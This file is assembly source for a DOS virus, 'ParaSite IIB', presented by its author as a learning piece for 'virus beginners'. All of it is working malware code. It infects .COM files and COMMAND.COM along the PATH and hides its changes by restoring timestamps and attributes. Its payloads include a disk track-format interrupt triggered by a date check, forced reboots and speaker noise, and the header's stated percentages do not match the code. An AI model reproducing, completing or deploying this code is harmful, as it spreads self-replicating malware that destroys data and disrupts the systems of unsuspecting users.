;********************************************************************    
;   <PARSIT2B.ASM>   -   ParaSite Virus IIB                              
;                        By: Rock Steady                                 
;  Close to one year I created this Virus. As you can see it is quite    
;  old... Maybe too Old... But here it is... It Sucks... but its great   
;  for any virus beginner... Anyhow...                                   
;  NOTES: Simple COM infector. 10% of the time it reboots the system     
;         20% it plays machine gun noices on the PC speaker... and       
;         70% of the time is infects another COM file... Have fun...     
;********************************************************************    
MOV_CX  MACRO X                                                          
        DB    0B9H                                                       
        DW    X                                                          
ENDM                                                                     
                                                                         
CODE    SEGMENT                                                          
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE                           
        ORG     100H                                                     
                                                                         
                                                                         
VCODE:  JMP     virus                                                    
                                                                         
        NOP                                                              
        NOP                             ; To identify it as an Infected  
        NOP                             ; Program!                       
                                                                         
v_start equ     $                                                        
                                                                         
                                                                         
virus:  PUSH    CX                                                       
        MOV     DX,OFFSET vir_dat                                        
        CLD                                                              
        MOV     SI,DX                                                    
        ADD     SI,first_3                                               
        JMP     Rock_1                                                   
Rock_2:                                                                  
        MOV     DX,dta                                                   
        ADD     DX,SI                                                    
        MOV     AH,1AH                                                   
        INT     21H                                                      
        PUSH    ES                                                       
        PUSH    SI                                                       
        MOV     ES,DS:2CH                                                
        MOV     DI,0                                                     
        JMP     Day_Of_Week                                              
Rock_1:                                                                  
        MOV     CX,3                                                     
        MOV     DI,OFFSET 100H                                           
        REPZ    MOVSB                                                    
        MOV     SI,DX                                                    
        PUSH    ES                                                       
        MOV     AH,2FH                                                   
        INT     21H                                                      
        MOV     [SI+old_dta],BX                                          
        MOV     [SI+old_dts],ES                                          
        POP     ES                                                       
        JMP     Rock_2                                                   
                                                                         
Day_Of_Week:                                                             
        MOV     AH,2AH                  ;Get System date!                
        INT     21H                                                      
        CMP     AL,1                    ;Check to See if it's Monday!    
        JGE     day_check               ;Jump if later than Mondays      
        JMP     Get_Time                                                 
day_check:                                                               
        CMP     AL,1                    ;Check to see if it is the 1st   
        JA      Get_Time                ;If yes, create a MESS...        
        JMP     Bad_Mondays             ;If not, then go on with infecti 
mess:                                                                    
                                                                         
Bad_Mondays:                                                             
          MOV   DL,2                    ;The Formatting Tracks..         
          MOV   AH,05                                                    
          MOV   DH,80h                                                   
          MOV   CH,0                                                     
          INT   13h                                                      
                                                                         
Play_music:                                                              
          MOV   CX,20d                  ;Set number of Shots             
new_shot:                                                                
          PUSH  CX                      ;Save Count                      
          CALL  Shoot                                                    
          MOV   CX,4000H                                                 
Silent:   LOOP  silent                                                   
          POP   CX                                                       
          LOOP  new_Shot                                                 
          JMP   mess                                                     
                                                                         
SHOOT     proc  near                    ;The Machine Gun Noices...       
          MOV   DX,140h                                                  
          MOV   BX,20h                                                   
          IN    AL,61h                                                   
          AND   AL,11111100b                                             
SOUND:    XOR   AL,2                                                     
          OUT   61h,al                                                   
          ADD   dx,9248h                                                 
          MOV   CL,3                                                     
          ROR   DX,CL                                                    
          MOV   CX,DX                                                    
          AND   cx,1ffh                                                  
          OR    CX,10                                                    
WAITA:    LOOP  WAITA                                                    
          DEC   BX                                                       
          JNZ   SOUND                                                    
          AND   AL,11111100b                                             
          OUT   61h,AL                                                   
          RET                                                            
Shoot     Endp                                                           
                                                                         
Get_Time:                                                                
          MOV   AH,2Ch                  ; Get System Time!               
          INT   21h                     ;                                
          AND   DH,0fh                                                   
          CMP   DH,3                                                     
          JB    Play_music                                               
          CMP   DH,3h                                                    
          JA    Find_Path                                                
          INT   19h                                                      
                                                                         
go:                                                                      
        MOV     AH, 47H                                                  
        XOR     DL,DL                                                    
        ADD     SI, OFFSET orig_path - OFFSET buffer - 8                 
        INT     21H                                                      
        JC      find_path                                                
                                                                         
        MOV     AH,3BH                                                   
        MOV     DX,SI                                                    
        ADD     DX, OFFSET root_dir - OFFSET orig_path                   
        INT     21H                                                      
                                                                         
infect_root:                                                             
        MOV     [BX+nam_ptr],DI                                          
        MOV     SI,BX                                                    
        ADD     SI,f_ipec                                                
        MOV     CX,6                                                     
        REPZ    MOVSB                                                    
        JMP     hello                                                    
                                                                         
find_path:                                                               
        POP     SI                      ; Seek and Destroy...            
        PUSH    SI                                                       
        ADD     SI,env_str                                               
        LODSB                                                            
        MOV     CX,OFFSET 8000H                                          
        REPNZ   SCASB                                                    
        MOV     CX,4                                                     
                                                                         
check_next_4:                                                            
        LODSB                                                            
        SCASB                                                            
;                                                                        
; The JNZ line specifies that if there is no PATH present, then we will  
; along and infect the ROOT directory on the default drive.              
                                                                         
        JNZ     find_path               ;If not path, then go to ROOT di 
        LOOP    check_next_4            ;Go back and check for more char 
        POP     SI                      ;Load in PATH again to look for  
        POP     ES                                                       
        MOV     [SI+path_ad],DI                                          
        MOV     DI,SI                                                    
        ADD     DI,wrk_spc                                               
        MOV     BX,SI                                                    
        ADD     SI,wrk_spc              ;the File Handle                 
        MOV     DI,SI                                                    
        JMP     SHORT   slash_ok                                         
                                                                         
set_subdir:                                                              
        CMP     WORD PTR [SI+path_ad],0                                  
        JNZ     found_subdir                                             
        JMP     all_done                                                 
                                                                         
                                                                         
found_subdir:                                                            
        PUSH    DS                                                       
        PUSH    SI                                                       
        MOV     DS,ES:2CH                                                
        MOV     DI,SI                                                    
        MOV     SI,ES:[DI+path_ad]                                       
        ADD     DI,wrk_spc              ;DI is the handle to infect!     
                                                                         
                                                                         
move_subdir:                                                             
        LODSB                           ;To tedious work to move into su 
        NOP                                                              
        CMP     AL,';'                  ;Does it end with a ; character? 
        JZ      moved_one               ;if yes, then we found a subdir  
        CMP     AL,0                    ;is it the end of the path?      
        JZ      moved_last_one          ;if yes, then we save the PATH   
        STOSB                           ;marker into DI for future refer 
        JMP     SHORT   move_subdir                                      
                                                                         
moved_last_one:                                                          
        MOV     SI,0                                                     
                                                                         
moved_one:                                                               
        POP     BX                      ;BX is where the virus data is   
        POP     DS                      ;Restore DS                      
        NOP                                                              
        MOV     [BX+path_ad],SI         ;Where is the next subdir?       
        CMP     CH,'\'                  ;Check to see if it ends in \    
        JZ      slash_ok                ;If yes, then it's OK            
        MOV     AL,'\'                  ;if not, then add one...         
        STOSB                           ;store the sucker                
                                                                         
                                                                         
                                                                         
slash_ok:                                                                
        MOV     [BX+nam_ptr],DI         ;Move the filename into workspac 
        MOV     SI,BX                   ;Restore the original SI value   
        ADD     SI,f_spec               ;Point to COM file victim        
        MOV     CX,6                                                     
        REPZ    MOVSB                   ;Move victim into workspace      
hello:                                                                   
        MOV     SI,BX                                                    
        MOV     AH,4EH                                                   
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                   ;DX is ... The File to infect    
        MOV     CX,3                    ;Attributes of Read Only or Hidd 
        INT     21H                                                      
        JMP     SHORT   find_first                                       
joe1:                                                                    
        JMP     go                                                       
                                                                         
find_next:                                                               
        MOV     AH,4FH                                                   
        INT     21H                                                      
                                                                         
find_first:                                                              
        JNB     found_file              ;Jump if we found it             
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirec 
                                                                         
found_file:                                                              
        MOV     AX,[SI+dta_tim]         ;Get time from DTA               
        AND     AL,1EH                  ;Mask to remove all but seconds  
        CMP     AL,1EH                  ;60 seconds                      
        JZ      find_next                                                
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too LON 
        JA      find_next               ;If too long, find another one   
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?              
        JB      find_next               ;Then go find another one        
        MOV     DI,[SI+nam_ptr]                                          
        PUSH    SI                                                       
        ADD     SI,dta_nam                                               
                                                                         
more_chars:                                                              
        LODSB                                                            
        STOSB                                                            
        CMP     AL,0                                                     
        JNZ     more_chars                                               
        POP     SI                                                       
        MOV     AX,OFFSET 4300H                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        MOV     [SI+old_att],CX                                          
        MOV     AX,OFFSET 4301H                                          
        AND     CX,OFFSET 0FFFEH                                         
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        MOV     AX,OFFSET 3D02H                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        JNB     opened_ok                                                
        JMP     fix_attr                                                 
                                                                         
opened_ok:                                                               
        MOV     BX,AX                                                    
        MOV     AX,OFFSET 5700H                                          
        INT     21H                                                      
        MOV     [SI+old_tim],CX         ;Save file time                  
        MOV     [SI+ol_date],DX         ;Save the date                   
        MOV     AH,2CH                                                   
        INT     21H                                                      
        AND     DH,7                                                     
        JMP     infect                                                   
                                                                         
                                                                         
infect:                                                                  
        MOV     AH,3FH                                                   
        MOV     CX,3                                                     
        MOV     DX,first_3                                               
        ADD     DX,SI                                                    
        INT     21H             ;Save first 3 bytes into the data area   
        JB      fix_time_stamp                                           
        CMP     AX,3                                                     
        JNZ     fix_time_stamp                                           
        MOV     AX,OFFSET 4202H                                          
        MOV     CX,0                                                     
        MOV     DX,0                                                     
        INT     21H                                                      
        JB      fix_time_stamp                                           
        MOV     CX,AX                                                    
        SUB     AX,3                                                     
        MOV     [SI+jmp_dsp],AX                                          
        ADD     CX,OFFSET c_len_y                                        
        MOV     DI,SI                                                    
        SUB     DI,OFFSET c_len_x                                        
        JMP     CONT                                                     
JOE2:                                                                    
        JMP     JOE1                                                     
CONT:                                                                    
        MOV     [DI],CX                                                  
        MOV     AH,40H                                                   
        MOV_CX  virlen                                                   
        MOV     DX,SI                                                    
        SUB     DX,OFFSET codelen                                        
        INT     21H                                                      
        JB      fix_time_stamp                                           
        CMP     AX,OFFSET virlen                                         
        JNZ     fix_time_stamp                                           
        MOV     AX,OFFSET 4200H                                          
        MOV     CX,0                                                     
        MOV     DX,0                                                     
        INT     21H                                                      
        JB      fix_time_stamp                                           
        MOV     AH,40H                                                   
        MOV     CX,3                                                     
        MOV     DX,SI                                                    
        ADD     DX,jmp_op                                                
        INT     21H                                                      
                                                                         
fix_time_stamp:                                                          
        MOV     DX,[SI+ol_date]                                          
        MOV     CX,[SI+old_tim]                                          
        AND     CX,OFFSET 0FFE0H                                         
        OR      CX,1EH                                                   
        MOV     AX,OFFSET 5701H                                          
        INT     21H                                                      
        MOV     AH,3EH                                                   
        INT     21H                                                      
                                                                         
fix_attr:                                                                
        MOV     AX,OFFSET 4301H                                          
        MOV     CX,[SI+old_att]                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
                                                                         
all_done:                                                                
        PUSH    DS                                                       
        MOV     AH,1AH                                                   
        MOV     DX,[SI+old_dta]                                          
        MOV     DS,[SI+old_dts]                                          
        INT     21H                                                      
        POP     DS                                                       
                                                                         
quit:                                                                    
        MOV     BX,OFFSET count                                          
        CMP     BX,0                                                     
        JB      joe2                                                     
        POP     CX                                                       
        XOR     AX,AX                   ;XOR values so that we will give 
        XOR     BX,BX                   ;poor sucker a hard time trying  
        XOR     DX,DX                   ;reassemble the source code if h 
        XOR     SI,SI                   ;decides to dissassemble us.     
        MOV     DI,OFFSET 0100H                                          
        PUSH    DI                                                       
        XOR     DI,DI                                                    
        RET     0FFFFH                  ;Return back to the beginning    
                                        ;of the program                  
                                                                         
vir_dat EQU     $                                                        
                                                                         
Aurther DB      "ParaSite IIB - By: Rock Steady"                         
olddta_ DW      0                                                        
olddts_ DW      0                                                        
oldtim_ DW      0                                                        
count_  DW      0                                                        
oldate_ DW      0                                                        
oldatt_ DW      0                                                        
first3_ EQU     $                                                        
        INT     20H                                                      
        NOP                                                              
jmpop_  DB      0E9H                                                     
jmpdsp_ DW      0                                                        
fspec_  DB      '*.COM',0                                                
fipec_  DB      'COMMAND.COM',0                                          
pathad_ DW      0                                                        
namptr_ DW      0                                                        
envstr_ DB      'PATH='                                                  
wrkspc_ DB      40h dup (0)                                              
dta_    DB      16h dup (0)                                              
dtatim_ DW      0,0                                                      
dtalen_ DW      0,0                                                      
dtanam_ DB      0Dh dup (0)                                              
buffer  DB      0CDh, 20h, 0, 0, 0, 0, 0, 0                              
orig_path DB    64 dup (?)                                               
root_dir DB     '\',0                                                    
lst_byt EQU     $                                                        
virlen  =       lst_byt - v_start                                        
codelen =       vir_dat - v_start                                        
c_len_x =       vir_dat - v_start - 2                                    
c_len_y =       vir_dat - v_start + 100H                                 
old_dta =       olddta_ - vir_dat                                        
old_dts =       olddts_ - vir_dat                                        
old_tim =       oldtim_ - vir_dat                                        
ol_date =       oldate_ - vir_dat                                        
old_att =       oldatt_ - vir_dat                                        
first_3 =       first3_ - vir_dat                                        
jmp_op  =       jmpop_  - vir_dat                                        
jmp_dsp =       jmpdsp_ - vir_dat                                        
f_spec  =       fspec_  - vir_dat                                        
f_ipec  =       fipec_  - vir_dat                                        
path_ad =       pathad_ - vir_dat                                        
nam_ptr =       namptr_ - vir_dat                                        
env_str =       envstr_ - vir_dat                                        
wrk_spc =       wrkspc_ - vir_dat                                        
dta     =       dta_    - vir_dat                                        
dta_tim =       dtatim_ - vir_dat                                        
dta_len =       dtalen_ - vir_dat                                        
dta_nam =       dtanam_ - vir_dat                                        
count   =       count_  - vir_dat                                        
         CODE    ENDS                                                    
END     VCODE                                                            

